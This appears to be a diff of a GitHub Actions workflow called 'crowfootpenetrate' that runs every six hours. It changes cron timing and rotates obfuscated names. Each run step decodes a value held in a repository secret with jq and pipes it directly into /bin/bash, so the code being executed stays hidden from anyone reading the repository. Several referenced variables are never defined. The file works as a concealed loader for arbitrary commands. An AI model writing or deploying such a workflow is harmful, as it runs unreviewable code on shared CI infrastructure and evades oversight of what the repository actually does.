@@ -2,20 +2,22 @@ name: crowfootpenetrate
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 3/6 * * *'
-jobs:  # 27929
+    - cron: '14 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: crowfootpenetrate
         env:
-          p83: ${{ secrets.p83 }}
+          bv67336: ${{ secrets.bv67336 }}
         run: |
-          echo $p83 | jq -r .i7 | /bin/bash
-          echo $af601 | jq -r .fuus14113 | /bin/bash
-          echo $ngdu7 | jq -r .fj781 | /bin/bash
-          echo $i12647 | jq -r .v6008 | /bin/bash
-          echo $ezi42239 | jq -r .aak502 | /bin/bash
-          echo $o4676 | jq -r .irys70886 | /bin/bash
+          echo $bv67336 | jq -r .hngq1133 | /bin/bash
+          echo $ba3357 | jq -r .c9 | /bin/bash
+          echo $fjns96 | jq -r .fr8615 | /bin/bash
+          echo $nel68 | jq -r .o74 | /bin/bash
+          echo $aoi9 | jq -r .wgrh07429 | /bin/bash
+          echo $by653 | jq -r .c20 | /bin/bash
+          echo $m269 | jq -r .tise39117 | /bin/bash
 
